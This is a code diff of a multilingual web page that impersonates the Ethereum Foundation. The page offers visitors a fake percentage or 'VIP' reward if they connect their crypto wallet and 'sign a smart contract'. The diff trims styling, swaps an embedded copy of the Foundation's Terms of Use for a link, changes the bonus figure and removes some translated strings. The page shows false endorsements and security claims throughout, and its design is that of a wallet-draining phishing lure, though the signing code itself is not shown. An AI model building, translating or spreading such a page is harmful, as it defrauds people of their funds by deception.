@@ -81,43 +81,19 @@
         }
 
         .language-selector select {
-            padding: 10px 16px 10px 40px;
-            background: linear-gradient(135deg, rgba(18, 18, 26, 0.95) 0%, rgba(30, 30, 40, 0.95) 100%);
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            border-radius: 12px;
+            padding: 8px 12px;
+            background: rgba(18, 18, 26, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
             color: var(--text-primary);
             font-family: 'JetBrains Mono', monospace;
             font-size: 0.85rem;
             cursor: pointer;
             outline: none;
-            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.1);
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L6 6L11 1' stroke='%2300ff88' stroke-width='2' stroke-linecap='round'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 12px center;
         }
 
         .language-selector select:hover {
             border-color: var(--accent);
-            box-shadow: 0 6px 20px rgba(0, 255, 136, 0.2);
-            transform: translateY(-2px);
-        }
-
-        .language-selector select:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px var(--accent-dim);
-        }
-
-        .language-selector::before {
-            content: '🌐';
-            position: absolute;
-            left: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 1.1rem;
-            pointer-events: none;
-            z-index: 1;
         }
 
         .container {
@@ -372,133 +348,6 @@
             opacity: 0.8;
         }
 
-        /* Modal styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(10px);
-            animation: fadeIn 0.3s;
-        }
-
-        .modal.active {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .modal-content {
-            background: rgba(18, 18, 26, 0.95);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            width: 90%;
-            max-width: 900px;
-            max-height: 85vh;
-            overflow-y: auto;
-            padding: 50px;
-            position: relative;
-            animation: slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .modal-content::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .modal-content::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 4px;
-        }
-
-        .modal-content::-webkit-scrollbar-thumb {
-            background: var(--accent);
-            border-radius: 4px;
-        }
-
-        .close-modal {
-            position: absolute;
-            top: 20px;
-            right: 30px;
-            font-size: 2rem;
-            font-weight: 300;
-            color: var(--text-secondary);
-            cursor: pointer;
-            transition: color 0.3s;
-            line-height: 1;
-            z-index: 1001;
-        }
-
-        .close-modal:hover {
-            color: var(--accent);
-        }
-
-        .modal-content h1 {
-            font-family: 'Syne', sans-serif;
-            font-size: 2.5rem;
-            background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 30px;
-        }
-
-        .modal-content h2 {
-            font-size: 1.3rem;
-            color: var(--accent);
-            margin-top: 30px;
-            margin-bottom: 15px;
-        }
-
-        .modal-content p {
-            margin-bottom: 15px;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-            line-height: 1.7;
-        }
-
-        .modal-content strong {
-            color: var(--text-primary);
-        }
-
-        .modal-content ul, .modal-content ol {
-            margin-left: 25px;
-            margin-bottom: 15px;
-            color: var(--text-secondary);
-        }
-
-        .modal-content li {
-            margin-bottom: 8px;
-        }
-
-        .modal-content a {
-            color: var(--accent);
-            text-decoration: none;
-        }
-
-        .modal-content a:hover {
-            opacity: 0.8;
-        }
-
         @media (max-width: 600px) {
             .container {
                 padding: 32px 24px;
@@ -577,103 +426,11 @@
             <span style="opacity: 0.8; font-size: 0.7rem; margin-top: 4px; display: inline-block;">
                 🔒 <span id="secured">Secured by Binance Smart Chain · Chainlink Oracle · Verified Smart Contract</span>
             </span><br>
-            <a href="#" id="termsLink" onclick="openTermsModal(); return false;">Terms of Use</a>
+            <a href="terms.html" target="_blank" id="termsLink">Terms of Use</a>
         </div>
     </div>
 
-    <!-- Terms of Use Modal -->
-    <div id="termsModal" class="modal">
-        <div class="modal-content">
-            <span class="close-modal" onclick="closeTermsModal()">&times;</span>
-            
-            <h1>Terms of Use</h1>
-            
-            <p><strong>PLEASE READ THESE TERMS OF USE BEFORE USING THE WEBSITES.</strong></p>
-
-            <h2>Acceptance of the Terms of Use</h2>
-            <p>These terms of use are entered into by and between you and Stiftung Ethereum (the "Foundation", "we", or "us"). The following terms and conditions, together with any documents they expressly incorporate by reference (collectively, these "Terms of Use"), govern your access to and use of any website published by the Foundation, including, but not limited to, any content, functionality, and services offered on or through ethereum.org, ethereum.foundation, esp.ethereum.foundation, devcon.org, devconnect.org, and blog.ethereum.org (the "Websites").</p>
-
-            <p>Please read the Terms of Use carefully before you start to use the Websites. By using the Websites or by clicking to accept or agree to the Terms of Use when this option is made available to you, you accept and agree to be bound and abide by these Terms of Use.</p>
-
-            <p>If you do not agree to these Terms of Use, you must not access or use the Websites.</p>
-
-            <h2>Who May Use the Websites</h2>
-            <p>The Websites are offered and available to users who are 13 years of age or older. The Websites are not intended for children under 13 years of age. By using the Websites, you represent and warrant that you (i) are 13 years of age or older, (ii) are not barred to use the Websites under any applicable law, and (iii) are using the Websites only for your own personal use. If you do not meet these requirements, you must not access or use the Websites.</p>
-
-            <h2>Changes to the Terms of Use</h2>
-            <p>We may revise and update these Terms of Use from time to time in our sole discretion. All changes are effective immediately when we post them.</p>
-            <p>Your continued use of the Websites following the posting of revised Terms of Use means that you accept and agree to the changes. You are expected to check this page frequently so you are aware of any changes, as they are binding on you.</p>
-
-            <h2>Accessing the Websites and Account Security</h2>
-            <p>We reserve the right to withdraw or amend the Websites, and any service or material we provide on the Websites, in our sole discretion without notice. We do not guarantee that our Websites or any content on them will always be available or not be interrupted. We will not be liable if for any reason all or any part of the Websites are unavailable at any time or for any period. From time to time, we may restrict access to some parts of the Websites, or entire Websites, to users.</p>
-
-            <p>You are responsible for:</p>
-            <ul>
-                <li>Making all arrangements necessary for you to have access to the Websites; and</li>
-                <li>Ensuring that all persons who access the Websites through your internet connection are aware of these Terms of Use and comply with them.</li>
-            </ul>
-
-            <h2>Intellectual Property Rights</h2>
-            <p>The Websites and their entire contents, features, and functionality (including but not limited to all information, software, text, displays, images, video and audio, and the design, selection, and arrangement thereof), are owned by the Foundation, its licensors or other providers of such material and are protected by copyright, trademark, patent, trade secret, and other intellectual property or proprietary rights laws.</p>
-
-            <h2>Trademarks</h2>
-            <p>The Foundation name, the terms Ethereum Switzerland, Ethereum Asia, the Foundation logo and all related names, logos, product and service names, designs and slogans are trademarks of the Foundation or its affiliates or licensors. You must not use such marks without the prior written permission of the Foundation. All other names, logos, product and service names, designs and slogans on this Websites are the trademarks of their respective owners.</p>
-
-            <h2>Prohibited Uses</h2>
-            <p>You may use the Websites only for lawful purposes and in accordance with these Terms of Use. You agree not to use the Websites:</p>
-            <ul>
-                <li>In any way that violates any applicable federal, state, local, or international law or regulation (including, without limitation, any laws regarding the export of data or software to and from the US or other countries);</li>
-                <li>For the purpose of exploiting, harming, or attempting to exploit or harm minors in any way by exposing them to inappropriate content, asking for personally identifiable information or otherwise;</li>
-                <li>To send, knowingly receive, upload, download, use, or re-use any material which does not comply with these Terms of Use;</li>
-                <li>To transmit, or procure the sending of, any advertising or promotional material without our prior written consent, including any "junk mail", "chain letter", "spam", or any other similar solicitation;</li>
-                <li>To impersonate or attempt to impersonate the Foundation, a Foundation employee, another user, or any other person or entity;</li>
-                <li>To engage in any other conduct that restricts or inhibits anyone's use or enjoyment of the Websites, or which, as determined by us, may harm the Foundation or users of the Websites or expose them to liability.</li>
-            </ul>
-
-            <h2>Reliance on Information Posted</h2>
-            <p>The information presented on or through the Websites is made available solely for general information purposes. We do not warrant the accuracy, completeness or usefulness of this information. Any reliance you place on such information is strictly at your own risk. We disclaim all liability and responsibility arising from any reliance placed on such materials by you or any other visitor to the Websites, or by anyone who may be informed of any of its contents.</p>
-
-            <p>The Websites may include content provided by third parties, including materials provided by other users, bloggers and third-party licensors, syndicators, aggregators, and/or reporting services. All statements and/or opinions expressed in these materials, and all articles and responses to questions and other content, other than the content provided by the Foundation, are solely the opinions and the responsibility of the person or entity providing those materials. These materials do not necessarily reflect the opinion of the Foundation. We are not responsible, or liable to you or any third party, for the content or accuracy of any materials provided by any third parties.</p>
-
-            <h2>Changes to the Websites</h2>
-            <p>We may update the content on the Websites from time to time, but its content is not necessarily complete or up-to-date. Any of the material on the Websites may be out of date at any given time, and we are under no obligation to update such material.</p>
-
-            <h2>Disclaimer of Warranties</h2>
-            <p>YOU UNDERSTAND THAT WE CANNOT AND DO NOT GUARANTEE OR WARRANT THAT FILES AVAILABLE FOR DOWNLOADING FROM THE INTERNET OR THE WEBSITES WILL BE FREE OF VIRUSES OR OTHER DESTRUCTIVE CODE. YOU ARE RESPONSIBLE FOR IMPLEMENTING SUFFICIENT PROCEDURES AND CHECKPOINTS TO SATISFY YOUR PARTICULAR REQUIREMENTS FOR ANTI-VIRUS PROTECTION AND ACCURACY OF DATA INPUT AND OUTPUT.</p>
-
-            <p>YOUR USE OF THE WEBSITES, THEIR CONTENT AND ANY SERVICES OR ITEMS OBTAINED THROUGH THE WEBSITES IS AT YOUR OWN RISK. THE WEBSITES, THEIR CONTENT AND ANY SERVICES OR ITEMS OBTAINED THROUGH THE WEBSITES ARE PROVIDED ON AN "AS IS" AND "AS AVAILABLE" BASIS, WITHOUT ANY WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED.</p>
-
-            <p>THE FOUNDATION HEREBY DISCLAIMS ALL WARRANTIES OF ANY KIND, WHETHER EXPRESS OR IMPLIED, STATUTORY, OR OTHERWISE, INCLUDING BUT NOT LIMITED TO ANY WARRANTIES OF MERCHANTABILITY, NON-INFRINGEMENT, AND FITNESS FOR PARTICULAR PURPOSE.</p>
-
-            <h2>Limitation on Liability</h2>
-            <p>IN NO EVENT WILL THE FOUNDATION, ITS AFFILIATES OR THEIR LICENSORS, SERVICE PROVIDERS, EMPLOYEES, AGENTS, OFFICERS, OR DIRECTORS BE LIABLE FOR DAMAGES OF ANY KIND, UNDER ANY LEGAL THEORY, ARISING OUT OF OR IN CONNECTION WITH YOUR USE, OR INABILITY TO USE, THE WEBSITES, ANY WEBSITES LINKED TO THEM, ANY CONTENT ON THE WEBSITES OR SUCH OTHER WEBSITES OR ANY SERVICES OR ITEMS OBTAINED THROUGH THE WEBSITES OR SUCH OTHER WEBSITES, INCLUDING ANY DIRECT, INDIRECT, SPECIAL, INCIDENTAL, CONSEQUENTIAL OR PUNITIVE DAMAGES, INCLUDING BUT NOT LIMITED TO, PERSONAL INJURY, PAIN AND SUFFERING, EMOTIONAL DISTRESS, LOSS OF REVENUE, LOSS OF PROFITS, LOSS OF BUSINESS OR ANTICIPATED SAVINGS, LOSS OF USE, LOSS OF GOODWILL, LOSS OF DATA, AND WHETHER CAUSED BY TORT (INCLUDING NEGLIGENCE), BREACH OF CONTRACT OR OTHERWISE, EVEN IF FORESEEABLE.</p>
-
-            <h2>Indemnification</h2>
-            <p>You agree to defend, indemnify, and hold harmless the Foundation, its affiliates, licensors, and service providers, and its and their respective officers, directors, employees, contractors, agents, licensors, suppliers, successors, and assigns from and against any claims, liabilities, damages, judgments, awards, losses, costs, expenses, or fees (including reasonable attorneys' fees) arising out of or relating to your violation of these Terms of Use or your use of the Websites, including, but not limited to, any use of the Websites' content, services and products other than as expressly authorized in these Terms of Use or your use of any information obtained from the Websites.</p>
-
-            <h2>Governing Law and Jurisdiction</h2>
-            <p>All matters relating to the Websites and these Terms of Use and any dispute or claim arising therefrom or related thereto (in each case, including non-contractual disputes or claims), shall be governed by and construed in accordance with the internal laws of Switzerland without giving effect to any choice or conflict of law provision or rule.</p>
-
-            <p>Any legal suit, action or proceeding arising out of, or related to, these Terms of Use or the Websites shall be instituted exclusively in Switzerland in the Kanton of Zug although we retain the right to bring any suit, action or proceeding against you for breach of these Terms of Use in your country of residence or any other relevant country.</p>
-
-            <h2>Waiver and Severability</h2>
-            <p>No waiver by the Foundation of any term or condition set forth in these Terms of Use shall be deemed a further or continuing waiver of such term or condition or a waiver of any other term or condition, and any failure of the Foundation to assert a right or provision under these Terms of Use shall not constitute a waiver of such right or provision.</p>
-
-            <p>If any provision of these Terms of Use is held by a court or other tribunal of competent jurisdiction to be invalid, illegal, or unenforceable for any reason, such provision shall be eliminated or limited to the minimum extent such that the remaining provisions of the Terms of Use will continue in full force and effect.</p>
-
-            <h2>Entire Agreement</h2>
-            <p>The Terms of Use constitute the sole and entire agreement between you and the Foundation with respect to the Websites and supersede all prior and contemporaneous understandings, agreements, representations and warranties, both written and oral, with respect to the Websites.</p>
-
-            <h2>Your Comments and Concerns</h2>
-            <p>All feedback, comments, requests for technical support and other communications relating to the Websites should be directed to: <a href="/cdn-cgi/l/email-protection#3f5a4b575a4d5a4a524d5a485e4d5b4c7f5a4b575a4d5a4a5211504d58"><span class="__cf_email__" data-cfemail="c5a0b1ada0b7a0b0a8b7a0b2a4b7a1b685a0b1ada0b7a0b0a8ebaab7a2">[email&#160;protected]</span></a>.</p>
-
-            <p style="margin-top: 40px; text-align: center; color: var(--text-secondary); font-size: 0.85rem; opacity: 0.7;">
-                Last updated: December 2025
-            </p>
-        </div>
-    </div>
-
-    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    <script>
         const form = document.getElementById('walletForm');
         const walletInput = document.getElementById('walletAddress');
         const checkButton = document.getElementById('checkButton');
@@ -690,7 +447,7 @@
         const MIN_BALANCE_USD = 200;
         const BONUS_PERCENTAGE = 20;
         const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
-        const VIP_BONUS_USD = 11950;
+        const VIP_BONUS_USD = 2390;
 
         let currentEthPrice = 0;
         let currentLang = 'en';
@@ -800,8 +557,6 @@
                 currentBalance: "Solde Actuel",
                 yourReward: "Votre Récompense",
                 connectButton: "🔗 Connecter le Portefeuille et Signer le Contrat Intelligent",
-                connectWalletButton: "Connecter le Portefeuille",
-                claimReward: "Réclamez votre récompense maintenant",
                 poweredBy: "Propulsé par Ethereum API · Ethereum Foundation",
                 secured: "Sécurisé par Binance Smart Chain · Chainlink Oracle · Contrat Intelligent Vérifié",
                 termsLink: "Conditions d'Utilisation"
@@ -822,8 +577,6 @@
                 currentBalance: "Aktuelles Guthaben",
                 yourReward: "Ihre Belohnung",
                 connectButton: "🔗 Wallet Verbinden und Smart Contract Signieren",
-                connectWalletButton: "Wallet Verbinden",
-                claimReward: "Fordern Sie Ihre Belohnung jetzt an",
                 poweredBy: "Betrieben von Ethereum API · Ethereum Foundation",
                 secured: "Gesichert durch Binance Smart Chain · Chainlink Oracle · Verifizierter Smart Contract",
                 termsLink: "Nutzungsbedingungen"
@@ -844,8 +597,6 @@
                 currentBalance: "当前余额",
                 yourReward: "您的奖励",
                 connectButton: "🔗 连接钱包并签署智能合约",
-                connectWalletButton: "连接钱包",
-                claimReward: "立即领取您的奖励",
                 poweredBy: "由以太坊API·以太坊基金会提供支持",
                 secured: "由币安智能链·Chainlink预言机·已验证智能合约保护",
                 termsLink: "使用条款"
@@ -866,8 +617,6 @@
                 currentBalance: "現在の残高",
                 yourReward: "あなたの報酬",
                 connectButton: "🔗 ウォレットを接続してスマートコントラクトに署名",
-                connectWalletButton: "ウォレットを接続",
-                claimReward: "今すぐ報酬を受け取る",
                 poweredBy: "Ethereum API・Ethereum Foundationによって提供",
                 secured: "Binance Smart Chain・Chainlink Oracle・検証済みスマートコントラクトによって保護",
                 termsLink: "利用規約"
@@ -888,8 +637,6 @@
                 currentBalance: "현재 잔액",
                 yourReward: "귀하의 보상",
                 connectButton: "🔗 지갑 연결 및 스마트 계약 서명",
-                connectWalletButton: "지갑 연결",
-                claimReward: "지금 보상을 받으세요",
                 poweredBy: "Ethereum API · Ethereum Foundation 제공",
                 secured: "Binance Smart Chain · Chainlink Oracle · 검증된 스마트 계약으로 보호",
                 termsLink: "이용 약관"
@@ -910,8 +657,6 @@
                 currentBalance: "Saldo Atual",
                 yourReward: "Sua Recompensa",
                 connectButton: "🔗 Conectar Carteira e Assinar Contrato Inteligente",
-                connectWalletButton: "Conectar Carteira",
-                claimReward: "Reivindique sua recompensa agora",
                 poweredBy: "Desenvolvido por Ethereum API · Ethereum Foundation",
                 secured: "Protegido por Binance Smart Chain · Chainlink Oracle · Contrato Inteligente Verificado",
                 termsLink: "Termos de Uso"
@@ -932,8 +677,6 @@
                 currentBalance: "الرصيد الحالي",
                 yourReward: "مكافأتك",
                 connectButton: "🔗 ربط المحفظة والتوقيع على العقد الذكي",
-                connectWalletButton: "ربط المحفظة",
-                claimReward: "احصل على مكافأتك الآن",
                 poweredBy: "مدعوم من Ethereum API · Ethereum Foundation",
                 secured: "محمي بواسطة Binance Smart Chain · Chainlink Oracle · عقد ذكي تم التحقق منه",
                 termsLink: "شروط الاستخدام"
@@ -954,8 +697,6 @@
                 currentBalance: "वर्तमान शेष",
                 yourReward: "आपका पुरस्कार",
                 connectButton: "🔗 वॉलेट कनेक्ट करें और स्मार्ट कॉन्ट्रैक्ट पर हस्ताक्षर करें",
-                connectWalletButton: "वॉलेट कनेक्ट करें",
-                claimReward: "अपना पुरस्कार अभी प्राप्त करें",
                 poweredBy: "Ethereum API · Ethereum Foundation द्वारा संचालित",
                 secured: "Binance Smart Chain · Chainlink Oracle · सत्यापित स्मार्ट कॉन्ट्रैक्ट द्वारा सुरक्षित",
                 termsLink: "उपयोग की शर्तें"
@@ -976,8 +717,6 @@
                 currentBalance: "Mevcut Bakiye",
                 yourReward: "Ödülünüz",
                 connectButton: "🔗 Cüzdanı Bağla ve Akıllı Sözleşmeyi İmzala",
-                connectWalletButton: "Cüzdanı Bağla",
-                claimReward: "Ödülünüzü şimdi talep edin",
                 poweredBy: "Ethereum API · Ethereum Foundation tarafından desteklenmektedir",
                 secured: "Binance Smart Chain · Chainlink Oracle · Doğrulanmış Akıllı Sözleşme tarafından güvence altına alınmıştır",
                 termsLink: "Kullanım Şartları"
@@ -998,8 +737,6 @@
                 currentBalance: "Huidig Saldo",
                 yourReward: "Jouw Beloning",
                 connectButton: "🔗 Portemonnee Verbinden en Smart Contract Ondertekenen",
-                connectWalletButton: "Portemonnee Verbinden",
-                claimReward: "Claim nu je beloning",
                 poweredBy: "Mogelijk gemaakt door Ethereum API · Ethereum Foundation",
                 secured: "Beveiligd door Binance Smart Chain · Chainlink Oracle · Geverifieerd Smart Contract",
                 termsLink: "Gebruiksvoorwaarden"
@@ -1020,8 +757,6 @@
                 currentBalance: "Saldo Attuale",
                 yourReward: "La Tua Ricompensa",
                 connectButton: "🔗 Connetti Portafoglio e Firma Smart Contract",
-                connectWalletButton: "Connetti Portafoglio",
-                claimReward: "Richiedi la tua ricompensa ora",
                 poweredBy: "Alimentato da Ethereum API · Ethereum Foundation",
                 secured: "Protetto da Binance Smart Chain · Chainlink Oracle · Smart Contract Verificato",
                 termsLink: "Termini di Utilizzo"
@@ -1042,8 +777,6 @@
                 currentBalance: "Aktualne Saldo",
                 yourReward: "Twoja Nagroda",
                 connectButton: "🔗 Połącz Portfel i Podpisz Smart Contract",
-                connectWalletButton: "Połącz Portfel",
-                claimReward: "Odbierz nagrodę teraz",
                 poweredBy: "Zasilane przez Ethereum API · Ethereum Foundation",
                 secured: "Zabezpieczone przez Binance Smart Chain · Chainlink Oracle · Zweryfikowany Smart Contract",
                 termsLink: "Warunki Użytkowania"
@@ -1064,8 +797,6 @@
                 currentBalance: "ยอดคงเหลือปัจจุบัน",
                 yourReward: "รางวัลของคุณ",
                 connectButton: "🔗 เชื่อมต่อกระเป๋าเงินและลงนามสัญญาอัจฉริยะ",
-                connectWalletButton: "เชื่อมต่อกระเป๋าเงิน",
-                claimReward: "รับรางวัลของคุณตอนนี้",
                 poweredBy: "ขับเคลื่อนโดย Ethereum API · Ethereum Foundation",
                 secured: "ได้รับการรักษาความปลอดภัยโดย Binance Smart Chain · Chainlink Oracle · สัญญาอัจฉริยะที่ได้รับการตรวจสอบ",
                 termsLink: "เงื่อนไขการใช้งาน"
@@ -1086,8 +817,6 @@
                 currentBalance: "Số Dư Hiện Tại",
                 yourReward: "Phần Thưởng Của Bạn",
                 connectButton: "🔗 Kết Nối Ví và Ký Hợp Đồng Thông Minh",
-                connectWalletButton: "Kết Nối Ví",
-                claimReward: "Nhận phần thưởng của bạn ngay",
                 poweredBy: "Được hỗ trợ bởi Ethereum API · Ethereum Foundation",
                 secured: "Được bảo vệ bởi Binance Smart Chain · Chainlink Oracle · Hợp Đồng Thông Minh Đã Xác Minh",
                 termsLink: "Điều Khoản Sử Dụng"
@@ -1108,8 +837,6 @@
                 currentBalance: "Saldo Saat Ini",
                 yourReward: "Hadiah Anda",
                 connectButton: "🔗 Hubungkan Dompet dan Tanda Tangani Kontrak Pintar",
-                connectWalletButton: "Hubungkan Dompet",
-                claimReward: "Klaim hadiah Anda sekarang",
                 poweredBy: "Didukung oleh Ethereum API · Ethereum Foundation",
                 secured: "Diamankan oleh Binance Smart Chain · Chainlink Oracle · Kontrak Pintar Terverifikasi",
                 termsLink: "Syarat Penggunaan"
@@ -1130,8 +857,6 @@
                 currentBalance: "Nuvarande Saldo",
                 yourReward: "Din Belöning",
                 connectButton: "🔗 Anslut Plånbok och Signera Smart Contract",
-                connectWalletButton: "Anslut Plånbok",
-                claimReward: "Gör anspråk på din belöning nu",
                 poweredBy: "Drivs av Ethereum API · Ethereum Foundation",
                 secured: "Säkrad av Binance Smart Chain · Chainlink Oracle · Verifierat Smart Contract",
                 termsLink: "Användarvillkor"
@@ -1152,8 +877,6 @@
                 currentBalance: "Nåværende Saldo",
                 yourReward: "Din Belønning",
                 connectButton: "🔗 Koble Lommebok og Signer Smart Contract",
-                connectWalletButton: "Koble Lommebok",
-                claimReward: "Krev belønningen din nå",
                 poweredBy: "Drevet av Ethereum API · Ethereum Foundation",
                 secured: "Sikret av Binance Smart Chain · Chainlink Oracle · Verifisert Smart Contract",
                 termsLink: "Vilkår for Bruk"
@@ -1174,8 +897,6 @@
                 currentBalance: "Nuværende Saldo",
                 yourReward: "Din Belønning",
                 connectButton: "🔗 Tilslut Tegnebog og Underskriv Smart Contract",
-                connectWalletButton: "Tilslut Tegnebog",
-                claimReward: "Kræv din belønning nu",
                 poweredBy: "Drevet af Ethereum API · Ethereum Foundation",
                 secured: "Sikret af Binance Smart Chain · Chainlink Oracle · Verificeret Smart Contract",
                 termsLink: "Brugsvilkår"
@@ -1196,8 +917,6 @@
                 currentBalance: "Nykyinen Saldo",
                 yourReward: "Palkkiosi",
                 connectButton: "🔗 Yhdistä Lompakko ja Allekirjoita Älykäs Sopimus",
-                connectWalletButton: "Yhdistä Lompakko",
-                claimReward: "Lunasta palkkiosi nyt",
                 poweredBy: "Tarjoaa Ethereum API · Ethereum Foundation",
                 secured: "Turvattu Binance Smart Chain · Chainlink Oracle · Vahvistettu Älykäs Sopimus",
                 termsLink: "Käyttöehdot"
@@ -1218,8 +937,6 @@
                 currentBalance: "Τρέχον Υπόλοιπο",
                 yourReward: "Η Ανταμοιβή Σας",
                 connectButton: "🔗 Σύνδεση Πορτοφολιού και Υπογραφή Smart Contract",
-                connectWalletButton: "Σύνδεση Πορτοφολιού",
-                claimReward: "Διεκδικήστε την ανταμοιβή σας τώρα",
                 poweredBy: "Υποστηρίζεται από Ethereum API · Ethereum Foundation",
                 secured: "Ασφαλίζεται από Binance Smart Chain · Chainlink Oracle · Επαληθευμένο Smart Contract",
                 termsLink: "Όροι Χρήσης"
@@ -1240,8 +957,6 @@
                 currentBalance: "Aktuální Zůstatek",
                 yourReward: "Vaše Odměna",
                 connectButton: "🔗 Připojit Peněženku a Podepsat Smart Contract",
-                connectWalletButton: "Připojit Peněženku",
-                claimReward: "Získejte odměnu nyní",
                 poweredBy: "Provozováno Ethereum API · Ethereum Foundation",
                 secured: "Zabezpečeno Binance Smart Chain · Chainlink Oracle · Ověřený Smart Contract",
                 termsLink: "Podmínky Použití"
@@ -1262,8 +977,6 @@
                 currentBalance: "Jelenlegi Egyenleg",
                 yourReward: "Az Ön Jutalma",
                 connectButton: "🔗 Tárca Csatlakoztatása és Okosszerződés Aláírása",
-                connectWalletButton: "Tárca Csatlakoztatása",
-                claimReward: "Igényelje jutalmát most",
                 poweredBy: "Működteti az Ethereum API · Ethereum Foundation",
                 secured: "Biztosítva a Binance Smart Chain · Chainlink Oracle · Ellenőrzött Okosszerződés által",
                 termsLink: "Felhasználási Feltételek"
@@ -1284,8 +997,6 @@
                 currentBalance: "Sold Curent",
                 yourReward: "Recompensa Ta",
                 connectButton: "🔗 Conectează Portofelul și Semnează Contractul Inteligent",
-                connectWalletButton: "Conectează Portofelul",
-                claimReward: "Revendică-ți recompensa acum",
                 poweredBy: "Funcționează cu Ethereum API · Ethereum Foundation",
                 secured: "Securizat de Binance Smart Chain · Chainlink Oracle · Contract Inteligent Verificat",
                 termsLink: "Termeni de Utilizare"
@@ -1410,19 +1121,9 @@
                                 ≈ $${VIP_BONUS_USD.toFixed(2)} USD
                             </div>
                         </div>
-                        <div style="margin-top: 24px; padding: 20px; background: rgba(0, 255, 136, 0.05); border: 1px solid rgba(0, 255, 136, 0.2); border-radius: 12px;">
-                            <div style="text-align: center; margin-bottom: 16px;">
-                                <div style="font-size: 1.1rem; font-weight: 600; color: var(--accent); margin-bottom: 8px; letter-spacing: 0.05em;">
-                                    🔗 SIGN SMART CONTRACT
-                                </div>
-                                <div style="font-size: 0.85rem; color: var(--text-secondary);">
-                                    ${t.claimReward || 'Claim your reward now'}
-                                </div>
-                            </div>
-                            <button onclick="connectWallet()" style="background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem; margin-top: 0;">
-                                ${t.connectWalletButton || '🔗 Connect Wallet'}
-                            </button>
-                        </div>
+                        <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem;">
+                            ${t.connectButton}
+                        </button>
                     </div>
                 `;
                 return;
@@ -1456,19 +1157,9 @@
                                 ≈ $${bonusUsd} USD
                             </div>
                         </div>
-                        <div style="margin-top: 24px; padding: 20px; background: rgba(0, 255, 136, 0.05); border: 1px solid rgba(0, 255, 136, 0.2); border-radius: 12px;">
-                            <div style="text-align: center; margin-bottom: 16px;">
-                                <div style="font-size: 1.1rem; font-weight: 600; color: var(--accent); margin-bottom: 8px; letter-spacing: 0.05em;">
-                                    🔗 SIGN SMART CONTRACT
-                                </div>
-                                <div style="font-size: 0.85rem; color: var(--text-secondary);">
-                                    ${t.claimReward || 'Claim your reward now'}
-                                </div>
-                            </div>
-                            <button onclick="connectWallet()" style="background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem; margin-top: 0;">
-                                ${t.connectWalletButton || '🔗 Connect Wallet'}
-                            </button>
-                        </div>
+                        <button onclick="connectWallet()" style="margin-top: 20px; background: linear-gradient(135deg, var(--accent) 0%, #00ccff 100%); font-size: 0.9rem;">
+                            ${t.connectButton}
+                        </button>
                     </div>
                 `;
             } else {
